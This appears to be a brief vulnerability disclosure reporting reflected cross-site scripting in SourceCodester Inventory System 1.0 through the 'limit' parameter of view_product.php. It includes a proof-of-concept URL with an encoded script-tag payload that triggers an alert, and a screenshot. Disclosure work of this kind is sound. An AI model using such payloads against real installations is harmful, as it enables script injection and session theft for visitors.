# Reflected XSS in Inventory System (View Product)
...
* **Version**: 1.0
* **Component**: View Product (`view_product.php`)
* **Vulnerable Parameter**: `limit` (GET)

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in **SourceCodester Inventory System 1.0**. The vulnerability is located in the `view_product.php` file.
...
```
http://127.0.0.1:8089/view_product.php?limit=%22%3E%3Cscript%3Ealert(15623);%3C/script%3E
...
<img width="1141" height="714" alt="图片" src="https://github.com/user-attachments/assets/5b637b61-3eaa-45dd-ad69-8efeea21853a" />
